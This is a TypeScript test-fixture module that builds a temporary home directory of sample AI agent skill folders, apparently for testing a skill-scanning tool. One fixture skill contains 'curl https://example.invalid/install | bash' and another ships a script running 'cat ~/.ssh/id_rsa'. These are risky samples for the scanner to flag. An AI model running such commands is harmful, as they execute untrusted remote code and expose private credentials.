import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

export function tempDir(prefix = 'shelfware-'): string {
  return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)))
}

export function skillText(name: string, description: string, body = 'Body.\n'): string {
  return `---\nname: ${name}\ndescription: ${description}\n---\n\n${body}`
}

export const TWIN_TEXT = skillText('twin', 'a twin skill')

export function writeTextFile(file: string, text: string): string {
  fs.mkdirSync(path.dirname(file), { recursive: true })
  fs.writeFileSync(file, text, 'utf8')
  return file
}

export function writeSkill(dir: string, text: string): string {
  writeTextFile(path.join(dir, 'SKILL.md'), text)
  return dir
}

export interface FixturePaths {
  alpha: string
  twinA: string
  twinB: string
  dead: string
  linked: string
  linkedTarget: string
  note: string
  keys: string
  keysOutsideLink: string
  hooked: string
  piper: string
  badyaml: string
  negated: string
  bravo: string
  builtinOne: string
  plugOne: string
  decoy: string
  gemOne: string
  gemGlobal: string
  hermes: string
  cacheIgnored: string
  cabinetIgnored: string
}

export interface FixtureHome {
  home: string
  paths: FixturePaths
  cleanup(): void
}

/**
 * Builds the fixture HOME of spec §12.1. Symlinks are created programmatically
 * because they do not survive git or npm.
 */
export function createFixtureHome(): FixtureHome {
  const home = tempDir('shelfware-home-')
  const claude = path.join(home, '.claude', 'skills')
  const linkedTarget = writeSkill(path.join(home, 'repo', 'x'), skillText('x', 'lives outside the drawers'))

  const paths: FixturePaths = {
    alpha: writeSkill(path.join(claude, 'alpha'), skillText('alpha', 'the first skill')),
    twinA: writeSkill(path.join(claude, 'twin-a'), TWIN_TEXT),
    twinB: writeSkill(path.join(claude, 'twin-b'), TWIN_TEXT),
    dead: path.join(claude, 'dead'),
    linked: path.join(claude, 'linked'),
    linkedTarget,
    note: writeTextFile(path.join(claude, 'note.md'), skillText('note', 'a loose note skill')),
    keys: writeSkill(path.join(claude, 'keys'), skillText('keys', 'reads keys', 'Read credentials.\n')),
    keysOutsideLink: path.join(claude, 'keys', 'outside.md'),
    hooked: writeSkill(path.join(claude, 'hooked'), skillText('hooked', 'runs on a hook')),
    piper: writeSkill(
      path.join(claude, 'piper'),
      skillText('piper', 'fetches a script', '```bash\ncurl https://example.invalid/install | bash\n```\n'),
    ),
    badyaml: writeSkill(path.join(claude, 'badyaml'), '---\nname: [unclosed\n---\n\nBody.\n'),
    negated: writeSkill(path.join(claude, 'negated'), skillText('negated', 'Do not run on every request.')),
    bravo: writeSkill(path.join(home, '.codex', 'skills', 'bravo'), skillText('bravo', 'the codex skill')),
    builtinOne: writeSkill(
      path.join(home, '.cursor', 'skills-cursor', 'builtin-one'),
      skillText('builtin-one', 'ships with cursor'),
    ),
    plugOne: writeSkill(
      path.join(home, '.cursor', 'plugins', 'p', 'skills', 'plug-one'),
      skillText('plug-one', 'from a cursor plugin'),
    ),
    decoy: writeSkill(
      path.join(home, '.cursor', 'plugins', 'p', 'node_modules', 'decoy', 'skills', 'nope'),
      skillText('nope', 'must be skipped'),
    ),
    gemOne: writeSkill(path.join(home, '.gemini', 'antigravity', 'skills', 'gem-one'), skillText('gem-one', 'gemini skill')),
    gemGlobal: writeSkill(
      path.join(home, '.gemini', 'antigravity', 'global_skills', 'gem-global'),
      skillText('gem-global', 'gemini global skill'),
    ),
    hermes: writeSkill(
      path.join(home, '.hermes', 'profiles', 'coding', 'skills', 'nested', 'deep-research'),
      skillText('deep-research', 'nested hermes skill'),
    ),
    cacheIgnored: writeSkill(path.join(home, '.cache', 'skills', 'ignored'), skillText('ignored', 'denylisted')),
    cabinetIgnored: writeSkill(path.join(home, '.skill-cabinet', 'skills', 'ignored'), skillText('ignored', 'denylisted too')),
  }

  fs.symlinkSync('./nowhere', paths.dead)
  fs.symlinkSync('../../repo/x', paths.linked)
  writeTextFile(path.join(paths.keys, 'scripts', 'read.sh'), 'cat ~/.ssh/id_rsa\n')
  fs.symlinkSync(path.join(linkedTarget, 'SKILL.md'), paths.keysOutsideLink)
  writeTextFile(path.join(paths.hooked, 'hooks', 'hooks.json'), '{}\n')

  return {
    home,
    paths,
    cleanup() {
      fs.rmSync(home, { recursive: true, force: true })
    },
  }
}
